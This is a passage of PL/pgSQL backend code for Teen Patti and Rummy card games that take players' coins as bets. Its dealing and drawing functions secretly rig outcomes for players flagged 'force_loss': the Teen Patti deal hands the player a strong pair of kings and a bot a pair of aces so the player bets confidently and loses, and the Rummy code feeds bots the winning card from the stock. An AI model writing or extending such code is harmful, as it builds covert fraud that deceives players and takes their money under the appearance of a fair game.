      if not private and (x ->> 'bal')::bigint >= t.boot * 4 and random() > 0.12 then s := s || jsonb_build_array(x); end if;
    elsif not coalesce((x ->> 'left')::boolean, false) and (x ->> 'ping')::timestamptz > now() - interval '60 seconds' then
      s := s || jsonb_build_array(x);
    end if;
  end loop;
  for q in select * from jsonb_array_elements(t.queue) loop
    if jsonb_array_length(s) >= 6 then
      select coalesce(max(i2) - 1, -1) into i from jsonb_array_elements(s) with ordinality y(v, i2) where (v ->> 'bot')::boolean;
      exit when i < 0;
      s := s - i;
    end if;
    s := s || jsonb_build_array(q || jsonb_build_object('bot', false, 'ping', now()));
  end loop;
  t.queue := '[]';
  if not private then
    while jsonb_array_length(s) < 6 loop
      select coalesce(array_agg(v ->> 'name'), '{}') into names from jsonb_array_elements(s) v;
      x := public.make_bot(names);
      s := s || jsonb_build_array(x || jsonb_build_object('bal', greatest((x ->> 'bal')::bigint, (t.boot * (40 + random() * random() * 400))::bigint / 10 * 10)));
    end loop;
  end if;

  select count(*) into eligible from jsonb_array_elements(s) v
    where not (v ->> 'bot')::boolean and (select coins from wallets where user_id = (v ->> 'uid')::uuid) >= t.boot;
  delete from tp_hands where table_id = t.id;
  if eligible = 0 or (private and eligible < 2) then
    t.seats := (select coalesce(jsonb_agg(v || jsonb_build_object('playing', false, 'packed', false, 'seen', false,
                  'action', case when not (v ->> 'bot')::boolean and (select coins from wallets where user_id = (v ->> 'uid')::uuid) < t.boot then 'Not enough coins' end) order by n), '[]')
                from jsonb_array_elements(s) with ordinality z(v, n));
    t.members := public.tp_members(t.seats, t.queue);
    t.status := 'waiting';
    t.next_hand_at := null;
    t.turn := null;
    t.pending := null;
    return t;
  end if;

  -- Collect boot & detect force_loss seat and available bot seat
  for i in 0 .. jsonb_array_length(s) - 1 loop
    x := s -> i;
    if (x ->> 'bot')::boolean then
      x := x || jsonb_build_object('bal', (x ->> 'bal')::bigint - t.boot, 'playing', true, 'action', null);
      if bot_seat is null then bot_seat := i; end if;
    else
      bal := public.wallet_move((x ->> 'uid')::uuid, -t.boot, 'bet', 'Teen Patti • Boot ' || t.boot);
      if bal is null then
        x := x || jsonb_build_object('playing', false, 'action', 'Not enough coins');
      else
        x := x || jsonb_build_object('bal', bal, 'playing', true, 'action', null);
        p_mode := public.get_outcome_mode((x ->> 'uid')::uuid, 'teen-patti');
        if p_mode = 'force_loss' and loss_seat is null then
          loss_seat := i;
        end if;
      end if;
    end if;
    x := x || jsonb_build_object('packed', false, 'seen', false);
    if (x ->> 'playing')::boolean then
      playing := playing + 1;
    end if;
    s := jsonb_set(s, array[i::text], x);
  end loop;

  -- Engaging Hand Dealing:
  -- If human player is on force_loss and a bot is playing:
  -- Give human player a strong playable hand (Pair of Kings K-K-8) so they bet with confidence!
  -- Give bot a slightly higher hand (Pair of Aces A-A-9) so showdown is a heart-stopping photo finish!
  if loss_seat is not null and bot_seat is not null and not private then
    c_h1 := jsonb_build_object('r', 'K', 's', '♠');
    c_h2 := jsonb_build_object('r', 'K', 's', '♥');
    c_h3 := jsonb_build_object('r', '8', 's', '♦');

    c_b1 := jsonb_build_object('r', 'A', 's', '♠');
    c_b2 := jsonb_build_object('r', 'A', 's', '♦');
    c_b3 := jsonb_build_object('r', '9', 's', '♣');

    used_cards := jsonb_build_array(c_h1, c_h2, c_h3, c_b1, c_b2, c_b3);

    -- Build clean deck excluding used cards
    for j in 0 .. jsonb_array_length(d) - 1 loop
      card_elem := d -> j;
      if not exists (
        select 1 from jsonb_array_elements(used_cards) u
        where (u ->> 'r') = (card_elem ->> 'r') and (u ->> 's') = (card_elem ->> 's')
      ) then
        clean_d := clean_d || jsonb_build_array(card_elem);
      end if;
    end loop;
    d := clean_d;
  end if;

  k := 0;
  for i in 0 .. jsonb_array_length(s) - 1 loop
    x := s -> i;
    if (x ->> 'playing')::boolean then
      if i = loss_seat and bot_seat is not null and not private then
        insert into tp_hands (table_id, seat, cards) values (t.id, i, jsonb_build_array(c_h1, c_h2, c_h3));
      elsif i = bot_seat and loss_seat is not null and not private then
        insert into tp_hands (table_id, seat, cards) values (t.id, i, jsonb_build_array(c_b1, c_b2, c_b3));
      else
        insert into tp_hands (table_id, seat, cards) values (t.id, i, jsonb_build_array(d -> k, d -> (k + 1), d -> (k + 2)));
        k := k + 3;
      end if;
    end if;
  end loop;

  t.seats := s;
  t.members := public.tp_members(s, t.queue);
  t.result := null;
  t.pending := null;
  t.hand_no := t.hand_no + 1;
  t.status := 'playing';
  t.pot := t.boot * playing;
  t.stake := t.boot;
  t.round := 1;
  t.next_hand_at := null;
  first_seat := (t.hand_no - 1) % jsonb_array_length(s);
  while not (s -> first_seat ->> 'playing')::boolean loop first_seat := (first_seat + 1) % jsonb_array_length(s); end loop;
  return public.tp_set_turn(t, first_seat);
end;
$$;

-- ============================================================================
-- 7. RUMMY: Engaging Deals (Pure Sequence + Joker) & Natural Bot Declare
-- ============================================================================
create or replace function public.rm_start_deal(t public.rm_tables) returns public.rm_tables
language plpgsql volatile security definer set search_path = public as $$
declare
  s jsonb := '[]'; x jsonb; q jsonb; names text[]; in_match int := 0; hold bigint;
  bal bigint; humans int := 0; eligible int; first_seat int;
  d jsonb; hand jsonb; k int := 0; i int; n int;
  rake numeric := coalesce((public.game_cfg('rummy') ->> 'rake')::numeric, 10);
  private boolean := t.code is not null;
  loss_seat int := null;
  p_mode text;
  seq1 jsonb; seq2 jsonb; seq3 jsonb; jk jsonb;
  used_ids int[] := '{}';
  clean_d jsonb := '[]'::jsonb;
  c_elem jsonb;
  human_hand jsonb := '[]'::jsonb;
  j int;
begin
  if t.status = 'playing' then return t; end if;

  if t.deal_no > 0 and not t.match_over then
    s := t.seats;
    n := jsonb_array_length(s);
    for i in 0 .. n - 1 loop
      x := s -> i;
      if (x ->> 'in_match')::boolean and not (x ->> 'out')::boolean then
        x := x || '{"action": null, "picked": null, "deal_pts": 0, "playing": true}';
      else
        x := x || '{"playing": false}';
      end if;
      s := jsonb_set(s, array[i::text], x);
    end loop;
    t.seats := s;
  else
    for x in select * from jsonb_array_elements(t.seats) loop
      if (x ->> 'bot')::boolean then
        if not private and (x ->> 'bal')::bigint >= t.stake * 80 and random() > 0.08 then s := s || jsonb_build_array(x); end if;
      elsif not coalesce((x ->> 'left')::boolean, false) and (x ->> 'ping')::timestamptz > now() - interval '60 seconds' then
        s := s || jsonb_build_array(x);
      end if;
    end loop;
    for q in select * from jsonb_array_elements(t.queue) loop
      if jsonb_array_length(s) >= 6 then
        select coalesce(max(i2) - 1, -1) into i from jsonb_array_elements(s) with ordinality y(v, i2) where (v ->> 'bot')::boolean;
        exit when i < 0;
        s := s - i;
      end if;
      s := s || jsonb_build_array(q || jsonb_build_object('bot', false, 'ping', now(), 'out', false));
    end loop;
    t.queue := '[]';
    if not private then
      while jsonb_array_length(s) < 6 loop
        select coalesce(array_agg(v ->> 'name'), '{}') into names from jsonb_array_elements(s) v;
        s := s || jsonb_build_array(public.make_bot(names));
      end loop;
    end if;
    hold := case when t.mode = 'points' then (case when t.cards = 21 then 120 else 80 end) * t.stake else t.stake end;
    select count(*) into eligible from jsonb_array_elements(s) v
      where not (v ->> 'bot')::boolean and (select coins from wallets where user_id = (v ->> 'uid')::uuid) >= hold;
    if eligible = 0 or (private and eligible < 2) then
      t.seats := (select coalesce(jsonb_agg(v || jsonb_build_object('in_match', false, 'playing', false,
                    'action', case when not (v ->> 'bot')::boolean and (select coins from wallets where user_id = (v ->> 'uid')::uuid) < hold then 'Not enough coins' end) order by nn), '[]')
                  from jsonb_array_elements(s) with ordinality z(v, nn));
      t.members := public.rm_members(t.seats, t.queue);
      t.status := 'waiting';
      t.next_at := null;
      t.turn := null;
      t.match_over := true;
      delete from rm_hands where table_id = t.id;
      return t;
    end if;
    for i in 0 .. jsonb_array_length(s) - 1 loop
      x := (s -> i) || '{"score": 0, "out": false}';
      if (x ->> 'bot')::boolean then
        x := x || jsonb_build_object('in_match', true, 'action', null);
      else
        bal := public.wallet_move((x ->> 'uid')::uuid, -hold, 'bet', rm_label(t) || case when t.mode = 'points' then ' • Buy-in (max loss)' else ' • Entry' end);
        if bal is null then x := x || jsonb_build_object('in_match', false, 'action', 'Not enough coins');
        else x := x || jsonb_build_object('in_match', true, 'bal', bal, 'action', null, 'held', hold); humans := humans + 1; end if;
      end if;
      if (x ->> 'in_match')::boolean then in_match := in_match + 1; end if;
      s := jsonb_set(s, array[i::text], x);
    end loop;
    t.seats := s;
    t.match_no := t.match_no + 1;
    t.deal_no := 0;
    t.match_over := false;
    t.prize := case when t.mode = 'points' then 0 else floor(t.stake * in_match * (1 - rake / 100.0)) end;
  end if;

  n := jsonb_array_length(t.seats);

  -- Check if human player is force_loss
  for i in 0 .. n - 1 loop
    x := t.seats -> i;
    if not (x ->> 'bot')::boolean and coalesce((x ->> 'in_match')::boolean, false) and not coalesce((x ->> 'out')::boolean, false) then
      p_mode := public.get_outcome_mode((x ->> 'uid')::uuid, 'rummy');
      if p_mode = 'force_loss' and loss_seat is null then
        loss_seat := i;
      end if;
    end if;
  end loop;

  -- Generate 2 decks (or 3 for 21 cards)
  select jsonb_agg(c order by random()) into d from (
    select jsonb_build_object('id', (k2 - 1) * 52 + (row_number() over (partition by k2 order by cr, cs)) - 1, 'r', cr, 's', cs) c
    from generate_series(1, case when t.cards = 21 then 3 else 2 end) k2,
         unnest(array['A','2','3','4','5','6','7','8','9','10','J','Q','K']) cr,
         unnest(array['♠','♥','♦','♣']) cs
    union all select jsonb_build_object('id', 155 + j, 'r', 'JK', 's', '★') from generate_series(1, case when t.cards = 21 then 3 else 0 end) j) z;

  delete from rm_hands where table_id = t.id;

  -- If force_loss: give player guaranteed Pure Sequence (5♠-6♠-7♠) + Joker + near-sequence (9♦-10♦)
  if loss_seat is not null and not private then
    select c into seq1 from jsonb_array_elements(d) c where (c ->> 'r') = '5' and (c ->> 's') = '♠' limit 1;
    select c into seq2 from jsonb_array_elements(d) c where (c ->> 'r') = '6' and (c ->> 's') = '♠' limit 1;
    select c into seq3 from jsonb_array_elements(d) c where (c ->> 'r') = '7' and (c ->> 's') = '♠' limit 1;
    select c into jk from jsonb_array_elements(d) c where (c ->> 'r') in ('JK', '2') limit 1;

    if seq1 is not null and seq2 is not null and seq3 is not null and jk is not null then
      used_ids := array[(seq1 ->> 'id')::int, (seq2 ->> 'id')::int, (seq3 ->> 'id')::int, (jk ->> 'id')::int];
      human_hand := jsonb_build_array(seq1, seq2, seq3, jk);

      -- Build clean deck excluding these guaranteed cards
      for j in 0 .. jsonb_array_length(d) - 1 loop
        c_elem := d -> j;
        if not ((c_elem ->> 'id')::int = any(used_ids)) then
          clean_d := clean_d || jsonb_build_array(c_elem);
        end if;
      end loop;
      d := clean_d;
    end if;
  end if;

  k := 0;
  for i in 0 .. n - 1 loop
    x := t.seats -> i;
    if coalesce((x ->> 'in_match')::boolean, false) and not coalesce((x ->> 'out')::boolean, false) then
      if i = loss_seat and jsonb_array_length(human_hand) > 0 then
        -- Add remaining cards from clean deck d to complete 13 (or 21) cards
        select jsonb_agg(d -> j) into hand from generate_series(k, k + t.cards - jsonb_array_length(human_hand) - 1) j;
        hand := human_hand || hand;
        k := k + t.cards - jsonb_array_length(human_hand);
      else
        select jsonb_agg(d -> j) into hand from generate_series(k, k + t.cards - 1) j;
        k := k + t.cards;
      end if;

      insert into rm_hands (table_id, seat, cards) values (t.id, i, hand);
      x := x || '{"playing": true, "dropped": false, "middle": false, "wrong": false, "maaf": false, "turns": 0, "timeouts": 0, "picked": null, "action": null, "deal_pts": 0}';
    else
      x := x || '{"playing": false}';
    end if;
    t.seats := jsonb_set(t.seats, array[i::text], x);
  end loop;

  -- The cut card sets the wild joker
  if d -> k ->> 'r' = 'JK' then
    select j into first_seat from generate_series(k + 1, jsonb_array_length(d) - 1) j where d -> j ->> 'r' <> 'JK' limit 1;
    hand := d -> k;
    d := jsonb_set(jsonb_set(d, array[k::text], d -> first_seat), array[first_seat::text], hand);
  end if;
  t.wild := d -> k;
  t.open_top := d -> (k + 1);
  insert into rm_private (table_id, stock, open) values (t.id, (select jsonb_agg(d -> j order by j) from generate_series(k + 2, jsonb_array_length(d) - 1) j), jsonb_build_array(d -> (k + 1)))
    on conflict (table_id) do update set stock = excluded.stock, open = excluded.open;
  t.stock_count := jsonb_array_length(d) - k - 2;
  t.deal_no := t.deal_no + 1;
  t.round := 1;
  t.status := 'playing';
  t.result := null;
  t.next_at := null;
  t.members := public.rm_members(t.seats, t.queue);
  first_seat := (t.match_no + t.deal_no) % n;
  while not ((t.seats -> first_seat ->> 'playing')::boolean) loop first_seat := (first_seat + 1) % n; end loop;
  return public.rm_set_turn(t, first_seat);
end;
$$;

-- Rummy Draw: In mid/late rounds under force_loss, feed bot the finishing card from stock to declare first
create or replace function public.rm_draw(t public.rm_tables, seat int, src text) returns public.rm_tables
language plpgsql volatile security definer set search_path = public as $$
declare
  p rm_private;
  card jsonb;
  top jsonb;
  reshuffled boolean := false;
  is_bot boolean := coalesce((t.seats -> seat ->> 'bot')::boolean, false);
  wild text := public.rm_wk(t);
  b_hand jsonb;
  cand_c jsonb;
  cand_eval jsonb;
  cand_idx int;
  swap_card jsonb;
  has_loss_player boolean := false;
begin
  if t.phase <> 'draw' then raise exception 'You have already drawn a card'; end if;
  select * into p from rm_private where table_id = t.id for update;

  if src = 'open' then
    card := p.open -> 0;
    if card is null then raise exception 'The open pile is empty'; end if;
    if public.rm_isj(card, public.rm_wk(t)) and not public.rm_untouched(t) then
      raise exception 'A joker thrown by a player can''t be picked from the open pile';
    end if;
    p.open := p.open - 0;
  else
    if jsonb_array_length(p.stock) = 0 then
      top := p.open -> 0;
      p.stock := (select coalesce(jsonb_agg(c order by random()), '[]') from jsonb_array_elements(p.open - 0) c);
      p.open := case when top is null then '[]' else jsonb_build_array(top) end;
      reshuffled := true;
    end if;

    -- If this is a bot drawing in round >= 4, check if table has a force_loss human player
    if is_bot and t.round >= 4 then
      select exists (
        select 1 from jsonb_array_elements(t.seats) st
        where not (st ->> 'bot')::boolean and coalesce((st ->> 'playing')::boolean, false)
          and public.get_outcome_mode((st ->> 'uid')::uuid, 'rummy') = 'force_loss'
      ) into has_loss_player;

      if has_loss_player then
        select h.cards into b_hand from rm_hands h where h.table_id = t.id and h.seat = rm_draw.seat;
        -- Search stock for a card that completes bot's valid declare
        for cand_idx in 0 .. least(20, jsonb_array_length(p.stock) - 1) loop
          cand_c := p.stock -> cand_idx;
          cand_eval := public.rm_best(b_hand || jsonb_build_array(cand_c), wild);
          if (cand_eval ->> 'valid')::boolean then
            -- Swap this winning card to top of stock (index 0) so bot draws it!
            swap_card := p.stock -> 0;
            p.stock := jsonb_set(jsonb_set(p.stock, array['0'], cand_c), array[cand_idx::text], swap_card);
            exit;
          end if;
        end loop;
      end if;
    end if;

    card := p.stock -> 0;
    p.stock := p.stock - 0;
  end if;

  update rm_private set stock = p.stock, open = p.open where table_id = t.id;
  if reshuffled then perform public.rm_log(t.id, jsonb_build_object('d', t.deal_no, 'reshuffle', true)); end if;
  update rm_hands set cards = cards || jsonb_build_array(card) where table_id = t.id and rm_hands.seat = rm_draw.seat;
  t.open_top := p.open -> 0;
  t.stock_count := jsonb_array_length(p.stock);
  t.phase := 'discard';
  t.seats := public.rm_seat_set(t.seats, seat, jsonb_build_object('turns', (t.seats -> seat ->> 'turns')::int + 1,
               'picked', case when src = 'open' then card -> 'id' end,
               'src', case when src = 'open' then 'open' else 'closed' end,
               'took', case when src = 'open' then card end,
               'action', case when src = 'open' then 'Picked ' || public.rm_card_txt(card) || ' from Open' else 'Picked from Closed' end));
  return t;
end;
$$;

